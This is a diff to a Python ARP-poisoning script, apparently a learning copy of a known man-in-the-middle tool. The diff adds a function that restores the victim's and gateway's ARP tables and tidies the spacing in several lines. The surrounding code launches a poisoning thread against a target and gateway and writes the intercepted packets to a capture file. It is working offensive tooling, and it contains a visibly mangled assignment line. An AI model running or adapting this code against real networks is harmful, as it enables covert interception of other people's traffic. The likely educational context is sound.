@@ -8,6 +8,15 @@ import sys
 import threading
 import signal
 
+def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
+    #different method using send
+    print("[*] Restoring target...")
+    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
+    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
+
+    #signals the main thread to exit
+    os.kill(os.getpid(), signal.SIGINT)
+
 #My interface
 interface = "enp56s0ulu4"
 #target device IP
@@ -31,7 +40,7 @@ if gateway_mac is None:
     print("[!!!] Failed to get gateway MAC. Exiting...")
     sys.exit(0)
 else:
-    print("[*] Gateway %s is at %s" % (gateway_ip,gateway_mac))
+    print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))
 
 target_mac = get_mac(target_ip)
 
@@ -39,7 +48,7 @@ if target_mac is None:
     print("[!!!] Failed to get target MAC. Exiting...")
     sys.exit(0)
 else:
-    print("[*] Target %s is at %s" % (target_ip,target_mac))
+    print("[*] Target %s is at %s" % (target_ip, target_mac))
 
 #start poison thread
 poison_thread = threading = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
@@ -55,10 +64,10 @@ try:
     wrpcap('arper.pcap',packets)
 
     #restore the network
-    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
 
 except KeyboardInterrupt:
     #Restort the network
-    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     sys.exit(0)
 
